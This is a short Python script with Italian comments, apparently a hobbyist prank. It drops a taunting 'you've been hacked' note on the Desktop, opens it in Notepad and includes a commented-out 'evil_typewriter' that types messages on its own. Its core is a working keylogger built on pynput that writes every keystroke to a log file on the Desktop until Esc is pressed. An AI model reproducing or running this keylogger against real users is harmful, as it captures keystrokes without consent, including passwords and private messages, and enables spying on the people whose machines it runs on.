import time
import os
from pynput import keyboard 
from pynput.keyboard import Controller #per premere tasti importo controller
import subprocess as sp

con = Controller() #non posso subito usare controller perchè è una funzione

# Ottieni la directory del desktop
desktop_directory = os.path.join(os.path.expanduser('~'), 'Desktop')
# Percorso completo del file sul desktop
file_path = os.path.join(desktop_directory, "Sup64.txt")
log = os.path.join(desktop_directory, "log.txt")
# Apre il file in modalità scrittura ('w')
#with mi chiude il file automaticamente
with open(log, 'w') as file:
    file.write("printiamo i log\n")
with open(file_path, 'w') as file:
    file.write("Cimato ti ha ackerato... quack quack, sei nei guai mascalzone")

sp.Popen(["notepad.exe", file_path])

def evil_typewriter(message):
    for character in message:
        con.type(character)
        time.sleep(0.1)
#trovo un modo per mettere blocco note in primo piano se ho altre finestre aperte
#evil_typewriter("Stiamo per prendere il possesso del tuo PC!")

def on_press(key):
    try:
        with open(log, 'a') as file:
            file.write(f'Key {key.char} pressed\n')
    except AttributeError:
        with open(log, 'a') as file:
            file.write(f'Special key {key} pressed\n')

def on_release(key):
    if key == keyboard.Key.esc: # Stop the keylogger
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()